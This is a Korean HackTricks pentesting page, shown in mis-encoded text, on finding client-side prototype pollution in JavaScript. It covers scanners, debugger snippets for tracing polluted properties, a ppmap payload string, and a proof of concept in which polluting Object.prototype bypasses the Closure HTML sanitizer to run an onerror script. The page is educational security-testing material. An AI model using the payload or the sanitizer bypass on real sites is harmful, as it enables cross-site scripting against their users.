# í´ë¼ì´ì–¸íŠ¸ ì¸¡ í”„ë¡œí† íƒ€ì… ì˜¤ì—¼

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ë¥¼** **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **Hacking íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>

## ìë™ ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ì—¬ ë°œê²¬í•˜ê¸°

ë„êµ¬ [**https://github.com/dwisiswant0/ppfuzz**](https://github.com/dwisiswant0/ppfuzz?tag=v1.0.0)**,** [**https://github.com/kleiton0x00/ppmap**](https://github.com/kleiton0x00/ppmap) **ë°** [**https://github.com/kosmosec/proto-find**](https://github.com/kosmosec/proto-find)ì€ **í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ ì·¨ì•½ì ì„ ì°¾ëŠ” ë° ì‚¬ìš©**ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë˜í•œ **ë¸Œë¼ìš°ì € í™•ì¥ í”„ë¡œê·¸ë¨** [**PPScan**](https://github.com/msrkp/PPScan)ì„ ì‚¬ìš©í•˜ì—¬ **ì•¡ì„¸ìŠ¤í•˜ëŠ” í˜ì´ì§€**ë¥¼ **ìë™ìœ¼ë¡œ ìŠ¤ìº”**í•˜ì—¬ í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ ì·¨ì•½ì ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ì†ì„±ì´ ì‚¬ìš©ë˜ëŠ” ìœ„ì¹˜ ë””ë²„ê¹… <a href="#5530" id="5530"></a>

{% code overflow="wrap" %}
```javascript
// Stop debugger where 'potentialGadget' property is accessed
Object.defineProperty(Object.prototype,'potentialGadget', {__proto__:null, get(){
console.trace();
return 'test';
}})
```
{% endcode %}

### í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ì˜ ê·¼ë³¸ ì›ì¸ ì°¾ê¸° <a href="#5530" id="5530"></a>

í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ ì·¨ì•½ì ì´ ë„êµ¬ ì¤‘ í•˜ë‚˜ì— ì˜í•´ ì‹ë³„ë˜ì—ˆê³  ì½”ë“œê°€ ë³µì¡í•˜ì§€ ì•Šì€ ê²½ìš°, Chrome ê°œë°œì ë„êµ¬ì—ì„œ `location.hash`, `decodeURIComponent`, ë˜ëŠ” `location.search`ì™€ ê°™ì€ í‚¤ì›Œë“œë¥¼ ê²€ìƒ‰í•˜ì—¬ ì·¨ì•½í•œ JavaScript ì½”ë“œì˜ ìœ„ì¹˜ë¥¼ ì •í™•íˆ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë” í¬ê³  ë³µì¡í•œ ì½”ë“œë² ì´ìŠ¤ì˜ ê²½ìš°, ì·¨ì•½í•œ ì½”ë“œë¥¼ ë°œê²¬í•˜ê¸° ìœ„í•´ ë‹¤ìŒ ë‹¨ê³„ë¥¼ ë”°ë¥¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

1. ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ì—¬ ì·¨ì•½ì ì„ ì‹ë³„í•˜ê³  ìƒì„±ìì— ì†ì„±ì„ ì„¤ì •í•˜ëŠ” í˜ì´ë¡œë“œë¥¼ ì–»ìŠµë‹ˆë‹¤. ppmapì—ì„œ ì œê³µí•˜ëŠ” ì˜ˆì‹œëŠ” ë‹¤ìŒê³¼ ê°™ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤: `constructor[prototype][ppmap]=reserved`.
2. í˜ì´ì§€ì—ì„œ ì‹¤í–‰ë  ì²« ë²ˆì§¸ JavaScript ì½”ë“œì˜ ì²« ì¤„ì— ì¤‘ë‹¨ì ì„ ì„¤ì •í•©ë‹ˆë‹¤. í˜ì´ë¡œë“œë¥¼ ì‚¬ìš©í•˜ì—¬ í˜ì´ì§€ë¥¼ ìƒˆë¡œ ê³ ì¹¨í•˜ë©´ ì´ ì¤‘ë‹¨ì ì—ì„œ ì‹¤í–‰ì´ ì¼ì‹œ ì¤‘ì§€ë©ë‹ˆë‹¤.
3. JavaScript ì‹¤í–‰ì´ ì¼ì‹œ ì¤‘ì§€ëœ ë™ì•ˆ JS ì½˜ì†”ì—ì„œ ë‹¤ìŒ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤. ì´ ìŠ¤í¬ë¦½íŠ¸ëŠ” 'ppmap' ì†ì„±ì´ ìƒì„±ë  ë•Œ ì‹ í˜¸ë¥¼ ë³´ë‚´ì–´ ì›ë³¸ì„ ì°¾ëŠ” ë° ë„ì›€ì´ ë©ë‹ˆë‹¤:
```javascript
function debugAccess(obj, prop, debugGet=true){

var origValue = obj[prop];

Object.defineProperty(obj, prop, {
get: function () {
if (debugGet)
debugger;
return origValue;
},
set: function(val) {
debugger;
origValue = val;
}
});

};

debugAccess(Object.prototype, 'ppmap')
```
4. **ì†ŒìŠ¤** íƒ­ìœ¼ë¡œ ëŒì•„ê°€ì„œ "ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰ ì¬ê°œ"ë¥¼ ì„ íƒí•©ë‹ˆë‹¤. JavaScriptê°€ ê³„ì† ì‹¤í–‰ë˜ê³  'ppmap' ì†ì„±ì´ ì˜ˆìƒëŒ€ë¡œ ì˜¤ì—¼ë©ë‹ˆë‹¤. ì œê³µëœ ì½”ë“œ ì¡°ê°ì„ ì‚¬ìš©í•˜ë©´ 'ppmap' ì†ì„±ì´ ì˜¤ì—¼ëœ ì •í™•í•œ ìœ„ì¹˜ë¥¼ ì‹ë³„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. **í˜¸ì¶œ ìŠ¤íƒ**ì„ ê²€ì‚¬í•˜ì—¬ ì˜¤ì—¼ì´ ë°œìƒí•œ ë‹¤ë¥¸ ìŠ¤íƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì¡°ì‚¬í•  ìŠ¤íƒì„ ê²°ì •í•  ë•Œ, í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ì´ ìì£¼ ë°œìƒí•˜ëŠ” JavaScript ë¼ì´ë¸ŒëŸ¬ë¦¬ íŒŒì¼ê³¼ ê´€ë ¨ëœ ìŠ¤íƒì„ ëŒ€ìƒìœ¼ë¡œ í•˜ëŠ” ê²ƒì´ ìœ ìš©í•©ë‹ˆë‹¤. ë¼ì´ë¸ŒëŸ¬ë¦¬ íŒŒì¼ì— ì—°ê²°ëœ í•´ë‹¹ ìŠ¤íƒì„ í™•ì¸í•˜ì—¬ ê´€ë ¨ ìŠ¤íƒì„ ì‹ë³„í•©ë‹ˆë‹¤(ì˜¤ë¥¸ìª½ì— í‘œì‹œë˜ëŠ” ì´ë¯¸ì§€ì™€ ìœ ì‚¬í•œ ë°©ì‹ìœ¼ë¡œ í™•ì¸ ê°€ëŠ¥). 4ë²ˆì§¸ ì¤„ê³¼ 6ë²ˆì§¸ ì¤„ê³¼ ê°™ì´ ì—¬ëŸ¬ ìŠ¤íƒì´ ìˆëŠ” ê²½ìš°, ì˜¤ì—¼ì˜ ì´ˆê¸° ë°œìƒì„ ë‚˜íƒ€ë‚´ëŠ” 4ë²ˆì§¸ ì¤„ì˜ ìŠ¤íƒì„ ì„ íƒí•˜ëŠ” ê²ƒì´ ë…¼ë¦¬ì ì¸ ì„ íƒì…ë‹ˆë‹¤. ìŠ¤íƒì„ í´ë¦­í•˜ë©´ ì·¨ì•½í•œ ì½”ë“œë¡œ ì´ë™í•©ë‹ˆë‹¤.

![https://miro.medium.com/max/1400/1\*S8NBOl1a7f1zhJxlh-6g4w.jpeg](https://miro.medium.com/max/1400/1\*S8NBOl1a7f1zhJxlh-6g4w.jpeg)

## ìŠ¤í¬ë¦½íŠ¸ ê°€ì ¯ ì°¾ê¸°

ê°€ì ¯ì€ **PP ì·¨ì•½ì ì´ ë°œê²¬ëœ í›„ ì•…ìš©ë  ì½”ë“œ**ì…ë‹ˆë‹¤.

ì‘ìš© í”„ë¡œê·¸ë¨ì´ ê°„ë‹¨í•œ ê²½ìš°, **`srcdoc/innerHTML/iframe/createElement`**ê³¼ ê°™ì€ **í‚¤ì›Œë“œ**ë¥¼ **ê²€ìƒ‰**í•˜ì—¬ ì†ŒìŠ¤ ì½”ë“œë¥¼ ê²€í† í•˜ê³  **ìë°”ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰ìœ¼ë¡œ ì´ì–´ì§€ëŠ”ì§€** í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë•Œë¡œëŠ” ì–¸ê¸‰ëœ ê¸°ìˆ ë¡œ ê°€ì ¯ì„ ì°¾ì„ ìˆ˜ ì—†ì„ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤. ì´ ê²½ìš°, ìˆœìˆ˜í•œ ì†ŒìŠ¤ ì½”ë“œ ê²€í† ë¥¼ í†µí•´ ì•„ë˜ ì˜ˆì‹œì™€ ê°™ì€ ì¢‹ì€ ê°€ì ¯ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Mithil ë¼ì´ë¸ŒëŸ¬ë¦¬ ì½”ë“œì—ì„œ PP ê°€ì ¯ ì°¾ê¸° ì˜ˆì‹œ

ë‹¤ìŒ ê¸€ì„ í™•ì¸í•˜ì„¸ìš”: [https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/](https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/)

## ì·¨ì•½í•œ ë¼ì´ë¸ŒëŸ¬ë¦¬ì— ëŒ€í•œ í˜ì´ë¡œë“œ ì¬ì»´íŒŒì¼

* [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution)
* [https://github.com/BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)

## PPë¥¼ í†µí•œ HTML ì‚°íƒ„í™”ê¸° ìš°íšŒ

[**ì´ ì—°êµ¬**](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)ëŠ” ì¼ë¶€ HTML ì‚°íƒ„í™”ê¸° ë¼ì´ë¸ŒëŸ¬ë¦¬ì—ì„œ ì œê³µí•˜ëŠ” **ì‚´í™” ê¸°ë²•ì„ ìš°íšŒ**í•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” PP ê°€ì ¯ì„ ë³´ì—¬ì¤ë‹ˆë‹¤:

* #### sanitize-html

<figure><img src="../../../.gitbook/assets/image (668).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-7.png"><figcaption></figcaption></figure>

* #### dompurify

<figure><img src="../../../.gitbook/assets/image (669).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-9.png"><figcaption></figcaption></figure>

* #### Closure
```html
<!-- from https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/ -->
<script>
Object.prototype['* ONERROR'] = 1;
Object.prototype['* SRC'] = 1;
</script>
<script src=https://google.github.io/closure-library/source/closure/goog/base.js></script>
<script>
goog.require('goog.html.sanitizer.HtmlSanitizer');
goog.require('goog.dom');
</script>
<body>
<script>
const html = '<img src onerror=alert(1)>';
const sanitizer = new goog.html.sanitizer.HtmlSanitizer();
const sanitized = sanitizer.sanitize(html);
const node = goog.dom.safeHtmlToNode(sanitized);

document.body.append(node);
</script>
```
## ì°¸ê³  ìë£Œ

* [https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746](https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746)
* [https://blog.s1r1us.ninja/research/PP](https://blog.s1r1us.ninja/research/PP)
* [https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:\~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ë¥¼** íŒ”ë¡œìš°í•˜ì„¸ìš”.
* **HackTricks**ì™€ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°ë²•ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
